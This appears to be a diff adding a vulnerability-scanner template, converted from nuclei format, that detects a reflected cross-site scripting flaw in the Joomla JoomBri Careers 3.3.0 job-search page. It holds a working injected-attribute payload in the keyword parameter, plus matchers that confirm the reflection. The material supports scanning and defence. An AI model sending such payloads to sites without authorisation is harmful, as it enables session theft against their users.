@@ -1,0 +1,122 @@
+{
+  "id": "joomla-joombri-careers-xss",
+  "name": "Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim\u0027s session token or login credentials.\n",
+  "references": [
+    "https://packetstormsecurity.com/files/168641/Joomla-JoomBri-Careers-3.3.0-Cross-Site-Scripting.html",
+    "https://cxsecurity.com/issue/WLB-2022100024",
+    "https://extensions.joomla.org/"
+  ],
+  "tags": [
+    "packetstorm",
+    "xss",
+    "joomla",
+    "joombri"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/for-jobseekers/search-jobs?keyword\u003dl9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body, \"alert(document.domain)\") \u0026\u0026 contains(body, \"Joomla\") \u0026\u0026 contains(tolower(body), \"joombri\")",
+            "contains(content_type, \"text/html\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "joomla-joombri-careers-xss",
+    "info": {
+      "name": "Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim\u0027s session token or login credentials.\n",
+      "reference": [
+        "https://packetstormsecurity.com/files/168641/Joomla-JoomBri-Careers-3.3.0-Cross-Site-Scripting.html",
+        "https://cxsecurity.com/issue/WLB-2022100024",
+        "https://extensions.joomla.org/"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "packetstorm,xss,joomla,joombri"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/for-jobseekers/search-jobs?keyword\u003dl9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body, \"alert(document.domain)\") \u0026\u0026 contains(body, \"Joomla\") \u0026\u0026 contains(tolower(body), \"joombri\")",
+              "contains(content_type, \"text/html\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
